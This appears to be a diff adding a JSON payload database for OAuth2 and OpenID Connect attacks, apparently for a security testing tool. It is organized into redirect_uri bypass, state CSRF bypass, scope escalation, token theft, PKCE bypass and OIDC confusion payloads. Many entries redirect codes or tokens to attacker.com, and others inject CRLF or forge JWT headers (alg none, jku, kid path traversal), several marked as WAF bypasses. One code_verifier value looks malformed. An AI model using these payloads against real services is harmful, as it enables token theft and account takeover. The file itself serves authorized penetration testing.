@@ -1,0 +1,81 @@
+{
+  "category": "oauth",
+  "contexts": {
+    "redirect_uri_manipulation": {
+      "description": "OAuth2 redirect_uri bypass payloads for token/code theft",
+      "payloads": [
+        {"payload": "https://attacker.com", "description": "Direct redirect to attacker domain", "waf_bypass": false},
+        {"payload": "https://legitimate.com@attacker.com", "description": "Authority component confusion via userinfo", "waf_bypass": true},
+        {"payload": "https://legitimate.com.attacker.com", "description": "Subdomain confusion — attacker-owned subdomain", "waf_bypass": true},
+        {"payload": "https://legitimate.com%40attacker.com", "description": "URL-encoded @ for parser confusion", "waf_bypass": true},
+        {"payload": "https://legitimate.com/callback?redirect=https://attacker.com", "description": "Open redirect chain on callback endpoint", "waf_bypass": false},
+        {"payload": "https://legitimate.com/callback/../redirect?url=attacker.com", "description": "Path traversal in redirect_uri", "waf_bypass": true},
+        {"payload": "https://legitimate.com/callback#@attacker.com", "description": "Fragment injection for token theft", "waf_bypass": true},
+        {"payload": "https://legitimate.com/callback%0d%0aLocation:%20https://attacker.com", "description": "CRLF injection in redirect_uri", "waf_bypass": true},
+        {"payload": "https://legitimate.com/callback/..%2f..%2f..%2fattacker-path", "description": "Double-encoded path traversal", "waf_bypass": true},
+        {"payload": "https://legitimate.com/callback?redirect_uri=https://attacker.com", "description": "Nested redirect_uri parameter pollution", "waf_bypass": false}
+      ]
+    },
+    "state_bypass": {
+      "description": "OAuth2 state parameter CSRF bypass payloads",
+      "payloads": [
+        {"payload": "", "description": "Empty state parameter — test if server requires it", "waf_bypass": false},
+        {"payload": "state=", "description": "Blank state value", "waf_bypass": false},
+        {"payload": "state=anything", "description": "Arbitrary state — test if server validates against session", "waf_bypass": false},
+        {"payload": "state=AAAA&state=BBBB", "description": "Duplicate state parameter — parser confusion", "waf_bypass": false},
+        {"payload": "state=null", "description": "Literal null as state value", "waf_bypass": false},
+        {"payload": "state=%00", "description": "Null byte in state parameter", "waf_bypass": true},
+        {"payload": "state=victim_state_value", "description": "Replay victim's state from intercepted request", "waf_bypass": false}
+      ]
+    },
+    "scope_escalation": {
+      "description": "OAuth2 scope parameter manipulation for privilege escalation",
+      "payloads": [
+        {"payload": "scope=openid profile email admin", "description": "Append admin scope to standard request", "waf_bypass": false},
+        {"payload": "scope=openid+profile+email+admin:write", "description": "Add write scope via plus-encoding", "waf_bypass": false},
+        {"payload": "scope=openid%20admin", "description": "URL-encoded space to inject admin scope", "waf_bypass": false},
+        {"payload": "scope=openid&scope=admin", "description": "Duplicate scope parameter for parser confusion", "waf_bypass": false},
+        {"payload": "scope=openid profile email user:* repo", "description": "Wildcard and high-privilege scopes (GitHub-style)", "waf_bypass": false},
+        {"payload": "scope=openid+profile+email+read:org+write:org", "description": "Org-level access scope injection", "waf_bypass": false},
+        {"payload": "scope=openid profile email&additional_scope=admin", "description": "Non-standard additional_scope parameter", "waf_bypass": false}
+      ]
+    },
+    "token_theft": {
+      "description": "OAuth2 access/refresh token theft techniques",
+      "payloads": [
+        {"payload": "response_type=token", "description": "Force implicit flow — token in URL fragment", "waf_bypass": false},
+        {"payload": "response_type=code+token", "description": "Hybrid flow — request both code and token", "waf_bypass": false},
+        {"payload": "response_type=id_token+token", "description": "Implicit+OIDC hybrid — tokens in fragment", "waf_bypass": false},
+        {"payload": "response_mode=fragment", "description": "Force fragment response mode for token in URL", "waf_bypass": false},
+        {"payload": "response_mode=query", "description": "Force query response mode — token in URL params (logged in proxies)", "waf_bypass": false},
+        {"payload": "response_mode=form_post", "description": "Force form_post mode — token in POST body", "waf_bypass": false},
+        {"payload": "grant_type=authorization_code&code=STOLEN_CODE", "description": "Code exchange without PKCE verifier", "waf_bypass": false},
+        {"payload": "grant_type=refresh_token&refresh_token=STOLEN_REFRESH", "description": "Refresh token replay without client auth", "waf_bypass": false}
+      ]
+    },
+    "pkce_bypass": {
+      "description": "PKCE (Proof Key for Code Exchange) bypass payloads",
+      "payloads": [
+        {"payload": "code_challenge_method=plain&code_challenge=attacker_verifier", "description": "Downgrade to plain PKCE — verifier equals challenge", "waf_bypass": false},
+        {"payload": "code_challenge=&code_challenge_method=S256", "description": "Empty code_challenge with S256 method", "waf_bypass": false},
+        {"payload": "grant_type=authorization_code&code=VALID_CODE", "description": "Exchange code without code_verifier — test if PKCE enforced", "waf_bypass": false},
+        {"payload": "code_verifier=a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a", "description": "Minimum-length code_verifier (43 chars)", "waf_bypass": false},
+        {"payload": "code_challenge_method=none", "description": "Non-standard method value — test parser handling", "waf_bypass": false},
+        {"payload": "code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk", "description": "Known test verifier — check if challenge validation works", "waf_bypass": false}
+      ]
+    },
+    "oidc_confusion": {
+      "description": "OpenID Connect implementation confusion attacks",
+      "payloads": [
+        {"payload": "{\"alg\": \"none\"}", "description": "JWT algorithm none — unsigned token accepted", "waf_bypass": false},
+        {"payload": "{\"alg\": \"HS256\"}", "description": "Algorithm confusion — RSA to HMAC downgrade, sign with public key", "waf_bypass": false},
+        {"payload": "iss=https://attacker.com/.well-known/openid-configuration", "description": "Issuer confusion — point to attacker OIDC config", "waf_bypass": false},
+        {"payload": "{\"sub\": \"admin\", \"email\": \"admin@target.com\"}", "description": "Sub/email claim manipulation in id_token", "waf_bypass": false},
+        {"payload": "{\"aud\": [\"client_a\", \"client_b\"]}", "description": "Multi-audience token — cross-client confusion", "waf_bypass": false},
+        {"payload": "client_id=VALID_CLIENT&client_secret=", "description": "Empty client_secret — test if secret validation enforced", "waf_bypass": false},
+        {"payload": "{\"kid\": \"../../attacker-key\"}", "description": "Key ID path traversal to load attacker JWK", "waf_bypass": true},
+        {"payload": "{\"jku\": \"https://attacker.com/jwks.json\"}", "description": "JKU header injection — load attacker keyset", "waf_bypass": true}
+      ]
+    }
+  }
+}
